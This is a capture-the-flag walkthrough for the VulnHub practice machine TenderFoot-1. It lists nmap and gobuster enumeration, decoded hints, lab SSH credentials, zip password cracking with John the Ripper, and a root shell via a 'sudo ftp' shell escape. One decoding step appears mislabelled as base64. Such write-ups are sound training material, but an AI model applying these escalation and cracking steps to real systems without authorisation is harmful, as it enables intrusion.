# [Machine](https://www.vulnhub.com/entry/tenderfoot-1,581/)

- # ENUM 
	- ### nmap (`nmap -A -p- TenderFoot-1`)
		- ```PORT   STATE SERVICE VERSION
			22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   2048 a2:b7:2d:95:e1:06:7f:a3:f1:8e:bc:5b:4c:29:19:61 (RSA)
			|   256 42:0c:c9:6d:1d:e9:84:19:6a:8a:d5:51:2c:69:c6:98 (ECDSA)
			|_  256 14:4d:74:42:78:67:9b:f3:dd:00:40:24:4d:12:c9:de (ED25519)
			80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
			|_http-server-header: Apache/2.4.18 (Ubuntu)
			|_http-title: Apache2 Ubuntu Default Page: It works
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```
		- #### OPEN PORTS
			- 22 -> ssh
			- 80 -> http
	- ### dirbuster & gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://tenderfoot-1 -x .html,.js,.txt,.php`)
		- #### DIRECTORIES
			- `/hint`
			- `/fotocd`
		- #### FILES
			- `/index.html`
			- `/robots.txt`
			- `/entry.js`

- # EXPLOITATION
	- "Found a directory? Open it `/hint`" (`/robots.txt`)
		- `/hint` -> `EBPV6X27L5PV6X27L5PV6X27L5PV6X27L4FHYICOGB2GQ2LOM4QEQZLSMUQSAIBAEAQCA7AKPQQFI4TZEBZW63LFORUGS3THEBSWY43FEF6AUIBNFUWS2LJNFUWS2LJNFUWS2LJNFUWS2LIKIVXHK3LFOJQXIZJANVXXEZJAHIUQ====` -> base32 -> `N0thing Here! Try something else! Enumerate more :)`
			- Nothing here...
	- Brainfuck language -> (`/fotocd/index.html`)
		- ```=================
			JDk5OTkwJA==
			=================
			
			Did you found username ?
			if yes:
			    Then you have cred. of one user, enter into user account 
			    by ssh port. syntax:{ssh username@IP}
			if not:
			    Then enumerate more :)
			    G00D LUCK !```
			- `JDk5OTkwJA==` -> base64 -> `$99990$` (password)
	- Username: monica (`/entry.js`)
	- Connect via SSH
		- Unzip the file (`gift.zip`) cracking the password with JohnTheRipper (`zip2john gift.zip > gift.hash` -> `john gift.hash`) 
			- Password: h4ck3d
			- No gift :/

- # PRIVILEGE ESCALATION
	- There's a script for getting chandler's shell (`/opt/exec/chandler`)
	- Find `user2.txt`: `find / -name user2.txt 2>/dev/null`
		- `/home/chandler/.cache` -> `note.txt`
			- `OBQXG43XMQ5FSMDVINZDIY3LJUZQ====` -> base64 -> `Y0uCr4ckM3`
	- Log into SSH with chandler's credentials and let's do `sudo -k`
		- FTP is running as root (no password)! Let's check on GTFOBins how to exploit this
			- `sudo ftp` -> `!/bin/sh`
				- We're ROOT!
